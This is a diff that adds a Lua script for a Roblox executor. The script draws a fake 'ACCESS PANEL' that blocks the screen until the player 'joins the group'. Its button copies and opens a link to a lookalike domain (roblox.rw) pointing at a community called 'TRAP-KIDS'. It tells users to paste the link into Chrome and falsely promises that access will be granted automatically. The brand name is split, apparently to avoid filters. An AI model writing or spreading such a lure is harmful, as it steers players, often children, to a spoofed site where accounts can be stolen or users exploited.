@@ -1,0 +1,142 @@
+local R = "Rob" .. "lox"
+local CommunityLink = "https://www.roblox.rw/communities/322593078802/TRAP-KIDS"
+local EyeBG = "rbxassetid://130311117868464"
+
+local parent = (gethui and gethui()) or game:GetService("CoreGui")
+if parent:FindFirstChild("AccessPanel") then parent.AccessPanel:Destroy() end
+
+local TweenService = game:GetService("TweenService")
+local gui = Instance.new("ScreenGui", parent)
+gui.Name = "AccessPanel"
+gui.IgnoreGuiInset = true
+
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 480, 0, 440)
+main.Position = UDim2.new(0.5, -240, 0.5, -220)
+main.BackgroundColor3 = Color3.fromRGB(10,10,10)
+main.BorderSizePixel = 0
+main.ClipsDescendants = true
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
+main.Active = true
+main.Draggable = true
+
+local bg = Instance.new("ImageLabel", main)
+bg.Size = UDim2.new(1.4,0,1.4,0)
+bg.Position = UDim2.new(-0.2,0,-0.2,0)
+bg.BackgroundTransparency = 1
+bg.Image = EyeBG
+bg.ScaleType = Enum.ScaleType.Crop
+bg.ImageTransparency = 0.35
+
+local overlay = Instance.new("Frame", main)
+overlay.Size = UDim2.new(1,0,1,0)
+overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
+overlay.BackgroundTransparency = 0.55
+overlay.BorderSizePixel = 0
+Instance.new("UICorner", overlay).CornerRadius = UDim.new(0,14)
+
+local line = Instance.new("Frame", main)
+line.Size = UDim2.new(1,0,0,3)
+line.BackgroundColor3 = Color3.fromRGB(0,255,136)
+line.BorderSizePixel = 0
+line.ZIndex = 10
+
+local t = Instance.new("TextLabel", main)
+t.Size = UDim2.new(1,0,0,40)
+t.Position = UDim2.new(0,0,0,20)
+t.BackgroundTransparency = 1
+t.Text = "ACCESS PANEL"
+t.Font = Enum.Font.GothamBlack
+t.TextSize = 28
+t.TextColor3 = Color3.fromRGB(255,255,255)
+t.RichText = false
+t.ZIndex = 5
+
+local s = Instance.new("TextLabel", main)
+s.Size = UDim2.new(1,0,0,20)
+s.Position = UDim2.new(0,0,0,58)
+s.BackgroundTransparency = 1
+s.Text = "Join the group to continue"
+s.Font = Enum.Font.GothamBold
+s.TextSize = 15
+s.TextColor3 = Color3.fromRGB(255,90,90)
+s.RichText = false
+s.ZIndex = 5
+
+-- UPDATED TEXT HERE
+local steps = Instance.new("TextLabel", main)
+steps.Size = UDim2.new(0, 420, 0, 150)
+steps.Position = UDim2.new(0, 30, 0, 90)
+steps.BackgroundTransparency = 1
+steps.Text = "1. Press JOIN GROUP\n2. Join our " .. R .. " Community for access\n3. If it doesn't open, paste in Chrome\n4. Join the group\n5. Access will be granted automatically"
+steps.Font = Enum.Font.GothamBold
+steps.TextSize = 16
+steps.TextColor3 = Color3.fromRGB(220,220,220)
+steps.TextXAlignment = Enum.TextXAlignment.Left
+steps.TextYAlignment = Enum.TextYAlignment.Top
+steps.TextWrapped = true
+steps.LineHeight = 1.4
+steps.RichText = false
+steps.ZIndex = 5
+
+local btn = Instance.new("TextButton", main)
+btn.Size = UDim2.new(0, 290, 0, 46)
+btn.Position = UDim2.new(0.5, -145, 0, 275)
+btn.BackgroundColor3 = Color3.fromRGB(0,122,255)
+btn.Text = "Join " .. R .. " Community"
+btn.Font = Enum.Font.GothamBlack
+btn.TextSize = 15
+btn.TextColor3 = Color3.fromRGB(255,255,255)
+btn.TextScaled = true
+btn.RichText = false
+btn.AutoButtonColor = false
+btn.ZIndex = 5
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+
+local btnStroke = Instance.new("UIStroke", btn)
+btnStroke.Thickness = 2.5
+btnStroke.Color = Color3.fromRGB(0,122,255)
+btnStroke.Transparency = 0.3
+
+task.spawn(function()
+    while btn.Parent do
+        local t1 = TweenService:Create(btnStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0, Thickness = 4})
+        local t2 = TweenService:Create(btn, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30,142,255)})
+        t1:Play() t2:Play()
+        task.wait(0.8)
+        local t3 = TweenService:Create(btnStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.6, Thickness = 2.5})
+        local t4 = TweenService:Create(btn, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(0,122,255)})
+        t3:Play() t4:Play()
+        task.wait(0.8)
+    end
+end)
+
+local help = Instance.new("TextLabel", main)
+help.Size = UDim2.new(1,0,0,20)
+help.Position = UDim2.new(0,0,0,360)
+help.BackgroundTransparency = 1
+help.Text = "Need help? Join TRAP KIDS Community"
+help.Font = Enum.Font.GothamBold
+help.TextSize = 11
+help.TextColor3 = Color3.fromRGB(120,120,120)
+help.RichText = false
+help.ZIndex = 5
+
+local close = Instance.new("TextButton", main)
+close.Size = UDim2.new(0,32,0,32)
+close.Position = UDim2.new(1,-38,0,8)
+close.BackgroundTransparency = 1
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(180,180,180)
+close.Font = Enum.Font.GothamBlack
+close.TextSize = 18
+close.ZIndex = 10
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+btn.MouseButton1Click:Connect(function()
+    if setclipboard then setclipboard(CommunityLink) end
+    pcall(function() game:GetService("GuiService"):OpenBrowserWindow(CommunityLink) end)
+    btn.Text = "OPENED! CHECK BROWSER"
+    task.wait(2)
+    btn.Text = "Join " .. R .. " Community"
+end)
